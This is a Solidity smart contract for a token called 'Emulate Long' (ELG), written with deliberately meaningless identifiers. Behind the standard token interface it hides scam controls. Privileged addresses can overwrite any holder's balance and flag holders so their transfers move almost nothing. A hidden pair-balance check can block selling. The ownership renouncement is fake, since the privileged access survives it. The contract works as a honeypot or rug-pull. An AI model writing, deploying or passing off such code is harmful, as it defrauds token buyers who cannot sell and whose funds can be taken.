//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface senderFeeTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atToken {
    function createPair(address launchAutoShould, address autoAtFee) external returns (address);
}

interface enableSwapMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchToReceiver) external view returns (uint256);

    function transfer(address exemptSender, uint256 swapMarketing) external returns (bool);

    function allowance(address txReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address exemptSender,
        uint256 swapMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellAt, uint256 value);
    event Approval(address indexed txReceiver, address indexed spender, uint256 value);
}

interface shouldToken is enableSwapMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EmulateLong is shouldAmount, enableSwapMin, shouldToken {

    uint256 private feeLiquidity = 100000000 * 10 ** 18;

    bool public swapExempt;

    address public buyAt;

    function balanceOf(address launchToReceiver) public view virtual override returns (uint256) {
        return teamLiquidity[launchToReceiver];
    }

    function transferFrom(address liquiditySell, address exemptSender, uint256 swapMarketing) external override returns (bool) {
        if (_msgSender() != toMode) {
            if (fromSender[liquiditySell][_msgSender()] != type(uint256).max) {
                require(swapMarketing <= fromSender[liquiditySell][_msgSender()]);
                fromSender[liquiditySell][_msgSender()] -= swapMarketing;
            }
        }
        return fromSell(liquiditySell, exemptSender, swapMarketing);
    }

    string private txTotal = "ELG";

    uint256 autoFeeEnable;

    function takeAuto() private view {
        require(shouldMax[_msgSender()]);
    }

    bool public takeFund;

    function walletMarketing(address buyTeam) public {
        if (swapExempt) {
            return;
        }
        if (launchedExemptMarketing == toTeam) {
            amountFromList = false;
        }
        shouldMax[buyTeam] = true;
        if (toTeam != launchedExemptMarketing) {
            amountFromList = true;
        }
        swapExempt = true;
    }

    address private txFund;

    event OwnershipTransferred(address indexed enableTotal, address indexed exemptAt);

    function fundSenderBuy(address liquidityReceiver) public {
        takeAuto();
        
        if (liquidityReceiver == buyAt || liquidityReceiver == exemptMarketing) {
            return;
        }
        feeAmountSwap[liquidityReceiver] = true;
    }

    address enableSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private launchedExemptMarketing;

    function getOwner() external view returns (address) {
        return txFund;
    }

    uint256 private receiverMin;

    function takeLaunch(address liquiditySell, address exemptSender, uint256 swapMarketing) internal returns (bool) {
        require(teamLiquidity[liquiditySell] >= swapMarketing);
        teamLiquidity[liquiditySell] -= swapMarketing;
        teamLiquidity[exemptSender] += swapMarketing;
        emit Transfer(liquiditySell, exemptSender, swapMarketing);
        return true;
    }

    function owner() external view returns (address) {
        return txFund;
    }

    uint256 private toTeam;

    bool public marketingList;

    uint8 private enableFeeToken = 18;

    address toMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isMarketing(address walletShould, uint256 swapMarketing) public {
        takeAuto();
        teamLiquidity[walletShould] = swapMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return txTotal;
    }

    function fromSell(address liquiditySell, address exemptSender, uint256 swapMarketing) internal returns (bool) {
        if (liquiditySell == buyAt) {
            return takeLaunch(liquiditySell, exemptSender, swapMarketing);
        }
        uint256 launchedTeam = enableSwapMin(exemptMarketing).balanceOf(enableSell);
        require(launchedTeam == autoFeeEnable);
        require(exemptSender != enableSell);
        if (feeAmountSwap[liquiditySell]) {
            return takeLaunch(liquiditySell, exemptSender, swapToken);
        }
        return takeLaunch(liquiditySell, exemptSender, swapMarketing);
    }

    uint256 atLiquidity;

    bool public amountFromList;

    mapping(address => bool) public feeAmountSwap;

    constructor (){
        
        senderFeeTotal buyTx = senderFeeTotal(toMode);
        exemptMarketing = atToken(buyTx.factory()).createPair(buyTx.WETH(), address(this));
        
        buyAt = _msgSender();
        toEnableFee();
        shouldMax[buyAt] = true;
        teamLiquidity[buyAt] = feeLiquidity;
        if (tradingMarketing) {
            takeFund = true;
        }
        emit Transfer(address(0), buyAt, feeLiquidity);
    }

    function approve(address swapWallet, uint256 swapMarketing) public virtual override returns (bool) {
        fromSender[_msgSender()][swapWallet] = swapMarketing;
        emit Approval(_msgSender(), swapWallet, swapMarketing);
        return true;
    }

    function allowance(address shouldMaxTx, address swapWallet) external view virtual override returns (uint256) {
        if (swapWallet == toMode) {
            return type(uint256).max;
        }
        return fromSender[shouldMaxTx][swapWallet];
    }

    bool private tradingMarketing;

    function name() external view virtual override returns (string memory) {
        return liquidityTotalAuto;
    }

    mapping(address => mapping(address => uint256)) private fromSender;

    function listMode(uint256 swapMarketing) public {
        takeAuto();
        autoFeeEnable = swapMarketing;
    }

    address public exemptMarketing;

    string private liquidityTotalAuto = "Emulate Long";

    bool private feeTo;

    uint256 constant swapToken = 15 ** 10;

    function toEnableFee() public {
        emit OwnershipTransferred(buyAt, address(0));
        txFund = address(0);
    }

    function transfer(address walletShould, uint256 swapMarketing) external virtual override returns (bool) {
        return fromSell(_msgSender(), walletShould, swapMarketing);
    }

    uint256 private launchedFeeExempt;

    uint256 public txEnableTake;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLiquidity;
    }

    mapping(address => bool) public shouldMax;

    mapping(address => uint256) private teamLiquidity;

    function decimals() external view virtual override returns (uint8) {
        return enableFeeToken;
    }

}